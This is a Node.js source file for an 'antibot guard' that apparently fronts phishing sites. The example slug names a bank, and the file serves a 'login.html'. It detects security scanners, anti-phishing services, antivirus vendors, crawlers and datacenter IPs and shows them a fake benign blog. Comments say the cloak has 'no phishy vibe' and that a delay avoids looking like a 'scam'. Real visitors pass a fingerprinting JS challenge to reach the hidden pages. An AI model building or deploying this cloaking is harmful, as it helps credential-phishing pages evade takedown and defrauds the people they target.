/**
 * ALP VPS Antibot Guard — deployed per-website VPS
 *
 * Runs as a Node.js sidecar on each VPS. Nginx proxies HTTP(S) to this process,
 * which decides in this order:
 *
 *   1. HARD BLOCK by IP     — datacenter/scanner ASNs → return cloaked page
 *   2. HARD BLOCK by UA     — bots/scanners/security tools → return cloaked page
 *   3. HARD BLOCK by hits   — rate limit / honeypot URLs → cloaked page
 *   4. JS CHALLENGE         — first-time real users, invisible, sets cookie
 *   5. PASS                 — serve real page from /var/www/<slug>/
 *
 * "Cloaked page" = a benign fake blog homepage that scanners see as clean.
 * Real users NEVER see it — only bots do.
 *
 * Environment:
 *   ALP_SLUG            — website slug (e.g. "investec")
 *   ALP_DOCROOT         — where the real site lives (default /var/www/<slug>)
 *   ALP_PORT            — listen port (default 3001)
 *   ALP_SECRET          — HMAC secret for challenge cookie
 *   ALP_PANEL_URL       — optional; where to report kills for telemetry
 */
'use strict';

const http     = require('http');
const fs       = require('fs');
const path     = require('path');
const crypto   = require('crypto');
const url      = require('url');
const zlib     = require('zlib');

// ─── Config ───────────────────────────────────────────────────────────────────
const SLUG       = process.env.ALP_SLUG        || 'site';
const DOCROOT    = process.env.ALP_DOCROOT     || `/var/www/${SLUG}`;
const PORT       = parseInt(process.env.ALP_PORT || '3001', 10);
const SECRET     = process.env.ALP_SECRET      || crypto.randomBytes(32).toString('hex');
const PANEL_URL  = process.env.ALP_PANEL_URL   || '';
const LOG_KILLS  = process.env.ALP_LOG_KILLS !== '0';

// ─── Data files (loaded from adjacent /data/ dir) ────────────────────────────
const DATA_DIR = path.join(__dirname, 'data');
let DC_CIDRS = [];     // datacenter/scanner CIDR ranges
let CLOAK_HTML = '';   // fake blog page

function loadData() {
  try {
    const cidrFile = path.join(DATA_DIR, 'datacenter-cidrs.txt');
    if (fs.existsSync(cidrFile)) {
      DC_CIDRS = fs.readFileSync(cidrFile, 'utf8')
        .split('\n')
        .map(l => l.trim())
        .filter(l => l && !l.startsWith('#'))
        .map(parseCidr)
        .filter(Boolean);
      console.log(`[antibot] loaded ${DC_CIDRS.length} datacenter CIDRs`);
    }
  } catch (e) { console.error('[antibot] CIDR load fail:', e.message); }

  try {
    const cloakFile = path.join(DATA_DIR, 'cloak.html');
    if (fs.existsSync(cloakFile)) {
      CLOAK_HTML = fs.readFileSync(cloakFile, 'utf8');
      console.log(`[antibot] loaded cloak page (${CLOAK_HTML.length} bytes)`);
    }
  } catch (e) { console.error('[antibot] cloak load fail:', e.message); }
}

// ─── CIDR / IP helpers ────────────────────────────────────────────────────────
function ipToInt(ip) {
  const parts = ip.split('.');
  if (parts.length !== 4) return null;
  let n = 0;
  for (const p of parts) {
    const x = parseInt(p, 10);
    if (isNaN(x) || x < 0 || x > 255) return null;
    n = (n * 256) + x;
  }
  return n;
}

function parseCidr(line) {
  const [ip, bitsStr] = line.split('/');
  const bits = parseInt(bitsStr, 10);
  const base = ipToInt(ip);
  if (base === null || isNaN(bits) || bits < 0 || bits > 32) return null;
  const mask = bits === 0 ? 0 : (~0 << (32 - bits)) >>> 0;
  return { base: (base & mask) >>> 0, mask, bits };
}

function ipInCidrs(ip, cidrs) {
  const n = ipToInt(ip);
  if (n === null) return false;
  for (const c of cidrs) {
    if ((n & c.mask) >>> 0 === c.base) return true;
  }
  return false;
}

function getClientIp(req) {
  return (
    req.headers['cf-connecting-ip'] ||
    req.headers['x-real-ip'] ||
    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
    req.socket?.remoteAddress ||
    '0.0.0.0'
  ).replace(/^::ffff:/, '');
}

// ─── UA blocklist ─────────────────────────────────────────────────────────────
const BOT_UA_PATTERNS = [
  // Empty / suspicious short UAs
  /^$/, /^Mozilla\/[45]\.0$/,
  // Explicit bot markers
  /\bbot\b/i, /\bcrawler\b/i, /\bspider\b/i, /\bscraper\b/i, /\bfetch\b/i,
  // HTTP libraries
  /curl\//i, /wget/i, /python-?requests/i, /python\//i, /aiohttp/i, /urllib/i,
  /java\//i, /Apache-HttpClient/i, /go-http-client/i, /libwww-perl/i,
  /okhttp/i, /node-fetch/i, /axios/i, /got\//i, /superagent/i,
  /^PostmanRuntime/i, /insomnia/i, /httpie/i, /reqwest/i,
  // Headless / automation
  /PhantomJS/i, /HeadlessChrome/i, /SlimerJS/i, /Puppeteer/i, /Playwright/i,
  /Selenium/i, /webdriver/i, /ChromeDriver/i, /geckodriver/i,
  // Search engines & social crawlers
  /Googlebot/i, /Bingbot/i, /Yahoo/i, /DuckDuck/i, /Baidu/i, /Yandex/i,
  /Applebot/i, /PetalBot/i, /facebookexternalhit/i, /meta-external/i,
  /Twitterbot/i, /LinkedInBot/i, /Pinterest/i, /Slackbot/i, /Discordbot/i,
  /TelegramBot/i, /WhatsApp/i, /SkypeUriPreview/i, /Google-InspectionTool/i,
  // SEO / analytics crawlers
  /Ahrefs/i, /SemrushBot/i, /MJ12/i, /DotBot/i, /rogerbot/i, /Exabot/i,
  /Screaming/i, /MegaIndex/i, /Barkrowler/i, /SEMrush/i, /Sogou/i,
  // Security scanners — CRITICAL
  /VirusTotal/i, /PhishTank/i, /SafeBrowsing/i, /GoogleSafeBrowsing/i,
  /URLScan/i, /urlscan\.io/i, /AbuseIPDB/i, /CheckPhish/i,
  /Netcraft/i, /Sucuri/i, /SiteCheck/i, /Qualys/i, /Rapid7/i, /Tenable/i,
  /Nessus/i, /Acunetix/i, /Burp/i, /ZAP/i, /Nikto/i, /Nmap/i, /Nuclei/i,
  /sqlmap/i, /wpscan/i, /dirbuster/i, /gobuster/i, /feroxbuster/i,
  /masscan/i, /zgrab/i, /shodan/i, /censys/i, /binaryedge/i, /criminalip/i,
  /PhishStats/i, /OpenPhish/i, /Cofense/i, /Cyren/i, /Forcepoint/i,
  /Fortinet/i, /Symantec/i, /BitDefender/i, /Kaspersky/i, /McAfee/i,
  /TrendMicro/i, /ESET/i, /Malwarebytes/i, /Webroot/i, /Cyble/i,
  /Group-?IB/i, /RecordedFuture/i, /Anomali/i, /Mandiant/i, /CrowdStrike/i,
  /Palo\s*Alto/i, /Cisco\s*Talos/i, /Talos/i, /IronPort/i, /Barracuda/i,
  // Generic security keywords
  /security[-_]?scan/i, /vuln[-_]?scan/i, /pentesting/i, /phish/i,
];

function isBotUA(ua) {
  if (!ua || ua.trim() === '') return true;
  if (ua.length < 20) return true; // legit browser UAs are always long
  return BOT_UA_PATTERNS.some(p => p.test(ua));
}

// ─── HMAC challenge token ────────────────────────────────────────────────────
function tokenFor(ip, offsetDays) {
  const d = new Date(Date.now() - offsetDays * 86_400_000).toISOString().slice(0, 10);
  return crypto.createHmac('sha256', SECRET).update(`${ip}:${d}`).digest('hex').slice(0, 32);
}
function newToken(ip) { return tokenFor(ip, 0); }
function checkToken(t, ip) { return t === tokenFor(ip, 0) || t === tokenFor(ip, 1); }

function getCookie(req, name) {
  const c = req.headers.cookie || '';
  const p = c.split(';').map(s => s.trim()).find(s => s.startsWith(name + '='));
  return p ? decodeURIComponent(p.slice(name.length + 1)) : null;
}

// ─── Rate limiter (per-IP) ────────────────────────────────────────────────────
const RATE_WIN_MS = 60_000;
const RATE_MAX    = 200;  // 200 req/min per IP — real users can burst on asset reloads,
                          // and admins testing their own site should not get cloaked
const _hits    = new Map();
const _blocked = new Map();

setInterval(() => {
  const now = Date.now();
  for (const [ip, e] of _hits)    if (now - e.ts > RATE_WIN_MS * 2) _hits.delete(ip);
  for (const [ip, t] of _blocked) if (now > t) _blocked.delete(ip);
}, 120_000);

function rateOk(ip) {
  const now = Date.now();
  if (_blocked.has(ip)) {
    if (now < _blocked.get(ip)) return false;
    _blocked.delete(ip);
  }
  const e = _hits.get(ip);
  if (!e || now - e.ts > RATE_WIN_MS) {
    _hits.set(ip, { count: 1, ts: now });
    return true;
  }
  e.count++;
  if (e.count > RATE_MAX) {
    _blocked.set(ip, now + 60_000); // 1 min block — long enough to shake off a scanner,
                                    // short enough that a caught admin can retry quickly
    return false;
  }
  return true;
}

// ─── Honeypot URLs (any hit = definitely a scanner) ──────────────────────────
const HONEYPOT_PATHS = [
  '/.env', '/.git/config', '/.git/HEAD', '/wp-admin', '/wp-login.php',
  '/administrator', '/phpmyadmin', '/.well-known/security.txt',
  '/config.php', '/.aws/credentials', '/backup.sql', '/dump.sql',
  '/robots.txt', // scanners hit this first
];
const _honeypotHit = new Set();

function isHoneypot(p) {
  return HONEYPOT_PATHS.some(h => p.startsWith(h));
}

// ─── Serving ──────────────────────────────────────────────────────────────────
const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.htm':  'text/html; charset=utf-8',
  '.css':  'text/css; charset=utf-8',
  '.js':   'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png':  'image/png',
  '.jpg':  'image/jpeg', '.jpeg': 'image/jpeg',
  '.gif':  'image/gif', '.svg': 'image/svg+xml', '.ico': 'image/x-icon',
  '.woff': 'font/woff', '.woff2': 'font/woff2',
  '.ttf':  'font/ttf', '.otf': 'font/otf',
  '.pdf':  'application/pdf', '.txt': 'text/plain; charset=utf-8',
};

function safeJoin(root, p) {
  const resolved = path.normalize(path.join(root, p));
  if (!resolved.startsWith(root)) return null;
  return resolved;
}

function serveFile(filePath, req, res) {
  fs.stat(filePath, (err, stat) => {
    if (!err) {
      if (stat.isDirectory()) {
        // Try index.html, login.html
        const tries = ['index.html', 'login.html'];
        let i = 0;
        const next = () => {
          if (i >= tries.length) return serveNotFound(res);
          const fp = path.join(filePath, tries[i++]);
          fs.access(fp, fs.constants.R_OK, e => e ? next() : streamFile(fp, req, res));
        };
        return next();
      }
      return streamFile(filePath, req, res);
    }
    // Extensionless miss (e.g. /error) → try /error.html so admin redirects
    // that use the xPages route naming keep working without the .html suffix.
    if (!path.extname(filePath)) {
      const htmlPath = filePath + '.html';
      return fs.access(htmlPath, fs.constants.R_OK, e => {
        if (e) return serveNotFound(res);
        streamFile(htmlPath, req, res);
      });
    }
    serveNotFound(res);
  });
}

function streamFile(filePath, req, res) {
  const ext = path.extname(filePath).toLowerCase();
  const mime = MIME[ext] || 'application/octet-stream';
  const ae = (req.headers['accept-encoding'] || '');
  const gz = /gzip/.test(ae);

  res.setHeader('Content-Type', mime);
  res.setHeader('Cache-Control', mime.startsWith('text/html') ? 'no-cache' : 'public, max-age=2592000');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');

  const stream = fs.createReadStream(filePath);

  // Inject antibot cookie for HTML responses
  if (mime.startsWith('text/html')) {
    let buf = [];
    stream.on('data', c => buf.push(c));
    stream.on('end', () => {
      let html = Buffer.concat(buf).toString('utf8');
      // No JS injection needed at this point — cookie is already set
      if (gz) {
        res.setHeader('Content-Encoding', 'gzip');
        res.end(zlib.gzipSync(html));
      } else {
        res.end(html);
      }
    });
    stream.on('error', () => serveNotFound(res));
    return;
  }

  if (gz && (mime.startsWith('text/') || mime.startsWith('application/javascript') || mime.startsWith('application/json'))) {
    res.setHeader('Content-Encoding', 'gzip');
    stream.pipe(zlib.createGzip()).pipe(res);
  } else {
    stream.pipe(res);
  }
}

function serveNotFound(res) {
  res.writeHead(404, { 'Content-Type': 'text/html; charset=utf-8' });
  res.end('<!doctype html><html><head><title>Not Found</title></head><body><h1>404 Not Found</h1></body></html>');
}

// Bots and scanners get the cloak page — looks legit, no phishy vibe
function serveCloak(req, res, reason) {
  if (LOG_KILLS) console.log(`[antibot] CLOAK ${reason} ip=${getClientIp(req)} ua="${(req.headers['user-agent']||'').slice(0,80)}" path=${req.url}`);
  reportKill(reason, req).catch(() => {});
  res.writeHead(200, {
    'Content-Type': 'text/html; charset=utf-8',
    'Cache-Control': 'no-cache',
    'X-Content-Type-Options': 'nosniff',
  });
  res.end(CLOAK_HTML || '<!doctype html><html><head><title>Welcome</title></head><body><h1>Welcome</h1><p>This site is under construction.</p></body></html>');
}

// Invisible JS challenge — served to first-time visitors from residential IPs
function serveChallenge(req, res, targetUrl) {
  const ip = getClientIp(req);
  const tok = newToken(ip);
  const html = buildChallengeHtml(targetUrl, tok);
  res.writeHead(200, {
    'Content-Type': 'text/html; charset=utf-8',
    'Cache-Control': 'no-cache',
    'X-Content-Type-Options': 'nosniff',
  });
  res.end(html);
}

function buildChallengeHtml(targetUrl, tok) {
  // Cookie set via JS after minimal browser checks pass. Real browsers pass
  // instantly; puppeteer-lite / requests won't.
  const t = JSON.stringify(targetUrl || '/');
  const k = JSON.stringify(tok);
  return `<!doctype html>
<html><head><meta charset="utf-8"><title>Loading…</title>
<style>body{margin:0;background:#f6f7f9;font-family:system-ui,sans-serif;color:#333;display:flex;align-items:center;justify-content:center;min-height:100vh}
.c{text-align:center;padding:40px}.s{width:32px;height:32px;border:3px solid #ddd;border-top-color:#3b82f6;border-radius:50%;margin:0 auto 16px;animation:s 1s linear infinite}
@keyframes s{to{transform:rotate(360deg)}}</style></head>
<body><div class="c"><div class="s"></div><p>Loading…</p></div>
<script>(function(){
  var T=${t},K=${k};
  // Definitive bot checks — fail these and we send nothing (page stays as-is)
  if(navigator.webdriver===true)return;
  if(window.callPhantom||window._phantom||window.__nightmare)return;
  if(!navigator.languages||navigator.languages.length===0)return;
  // Real browsers all have chrome/moz/webkit — headless usually lacks
  if(!(window.chrome||window.CSS||window.webkitURL))return;
  // Canvas fingerprint
  try{var cv=document.createElement("canvas"),x=cv.getContext("2d");
    x.fillText("t",1,1);if(cv.toDataURL().length<50)return;}catch(e){return}
  // OK, looks human — set cookie and redirect
  var exp=new Date(Date.now()+86400000).toUTCString();
  document.cookie="_abg="+K+"; path=/; expires="+exp+"; SameSite=Lax";
  // small delay so we don't look like an instant-redirect scam
  setTimeout(function(){window.location.replace(T)},400+Math.random()*400);
})();</script>
</body></html>`;
}

// ─── Optional telemetry to panel ─────────────────────────────────────────────
function reportKill(reason, req) {
  if (!PANEL_URL) return Promise.resolve();
  return new Promise(resolve => {
    try {
      const body = JSON.stringify({
        slug: SLUG,
        reason,
        ip: getClientIp(req),
        ua: (req.headers['user-agent'] || '').slice(0, 200),
        path: req.url,
        host: req.headers.host,
        ts: Date.now(),
      });
      const u = new URL(PANEL_URL + '/api/antibot/telemetry');
      const opts = {
        method: 'POST',
        hostname: u.hostname,
        port: u.port || (u.protocol === 'https:' ? 443 : 80),
        path: u.pathname,
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
        timeout: 2000,
      };
      const client = u.protocol === 'https:' ? require('https') : http;
      const rq = client.request(opts, r => { r.on('data', () => {}); r.on('end', resolve); });
      rq.on('error', resolve);
      rq.on('timeout', () => { rq.destroy(); resolve(); });
      rq.write(body);
      rq.end();
    } catch { resolve(); }
  });
}

// ─── Main handler ─────────────────────────────────────────────────────────────
function handle(req, res) {
  const ip  = getClientIp(req);
  const ua  = req.headers['user-agent'] || '';
  const p   = url.parse(req.url).pathname || '/';

  // Health endpoint — bypass all checks
  if (p === '/__alp_health') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ ok: true, slug: SLUG, uptime: process.uptime() }));
  }

  // 0. Block non-Cloudflare traffic — if cf-ray is missing, the request
  //    bypassed the CF proxy (direct-IP hit, scanner, or DNS misconfiguration).
  //    Only localhost (nginx loopback probes) is exempt.
  if (!req.headers['cf-ray']) {
    const srcIp = (req.headers['x-real-ip'] || '').replace(/^::ffff:/, '');
    if (srcIp && srcIp !== '127.0.0.1' && srcIp !== '::1') {
      return serveCloak(req, res, 'cf-bypass');
    }
  }

  // 1. Honeypot: any hit = permanent kill for this IP
  if (isHoneypot(p)) {
    _blocked.set(ip, Date.now() + 86_400_000); // 24h block
    _honeypotHit.add(ip);
    return serveCloak(req, res, 'honeypot:' + p);
  }
  if (_honeypotHit.has(ip)) return serveCloak(req, res, 'honeypot-known');

  // 2. Rate limit (before any real work)
  if (!rateOk(ip)) return serveCloak(req, res, 'ratelimit');

  // 3. UA blocklist
  if (isBotUA(ua)) return serveCloak(req, res, 'bot-ua');

  // 4. Datacenter IP (scanners, cloud servers, etc.)
  if (ipInCidrs(ip, DC_CIDRS)) return serveCloak(req, res, 'datacenter-ip');

  // 5. Valid challenge cookie? → pass through
  const cookie = getCookie(req, '_abg');
  if (cookie && checkToken(cookie, ip)) {
    const fp = safeJoin(DOCROOT, p);
    if (!fp) return serveNotFound(res);
    return serveFile(fp, req, res);
  }

  // 6. First-time visitor from a residential IP — issue challenge
  //    (returns page with JS that sets cookie and reloads)
  serveChallenge(req, res, p + (url.parse(req.url).search || ''));
}

// ─── Start ────────────────────────────────────────────────────────────────────
loadData();
const server = http.createServer(handle);
server.listen(PORT, '127.0.0.1', () => {
  console.log(`[antibot] listening on 127.0.0.1:${PORT} slug=${SLUG} docroot=${DOCROOT}`);
  console.log(`[antibot] panel=${PANEL_URL || '(no telemetry)'}`);
});

// Reload data on SIGHUP
process.on('SIGHUP', () => {
  console.log('[antibot] SIGHUP — reloading data files');
  loadData();
});
